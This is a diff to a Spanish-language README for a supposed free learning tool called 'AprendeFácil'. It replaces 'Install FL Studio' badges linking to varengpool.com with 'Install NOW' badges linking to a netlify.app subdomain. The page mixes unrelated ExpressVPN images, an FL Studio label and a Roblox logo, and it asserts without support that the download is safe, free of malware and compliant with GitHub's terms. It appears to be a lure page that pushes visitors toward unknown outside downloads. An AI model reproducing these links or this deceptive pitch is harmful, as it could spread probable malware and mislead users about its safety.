@@ -3,7 +3,7 @@
  ![Actualizado: Agosto 2025](https://static.independent.co.uk/2025/01/24/16/expressvpn.jpg)  
  ![Visitantes: 12K+](https://img.shields.io/badge/Visitantes-12K+-ff9f43)
 
-- [![Install FL Studio](https://img.shields.io/badge/Install-NOW-blueviolet)](https://varengpool.com)
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
 
 **Descripción**  
 **AprendeFácil** es un recurso gratuito de 2025 para principiantes que desean aprender nuevas habilidades. Diseñado para estudio local y autónomo, es seguro, de código abierto y cumple con los Términos de Servicio de GitHub. ¡Únete a más de 12K usuarios para comenzar tu viaje de aprendizaje hoy!  
@@ -31,7 +31,7 @@ AprendeFácil es solo para uso local y personal, conforme con los Términos de S
    Sigue las instrucciones en la sección de *Releases* para comenzar.  
 4. **¿Necesitas Ayuda?** ❓  
    Abre un *issue* en este repositorio para obtener soporte.  
-- [![Install FL Studio](https://img.shields.io/badge/Install-NOW-blueviolet)](https://varengpool.com)
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
 
 **Seguridad**  
 - 🔐 **Seguro**: De código abierto, con licencia MIT, sin malware.  
@@ -47,7 +47,7 @@ Aquí hay más funcionalidad
 
 ![Vista Previa](https://cdn.webservertalk.com/wp-content/uploads/Express-VPN-Review.jpg)  
 
-- [![Install FL Studio](https://img.shields.io/badge/Install-NOW-blueviolet)](https://varengpool.com)
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
 
 
 **Contribuir**  
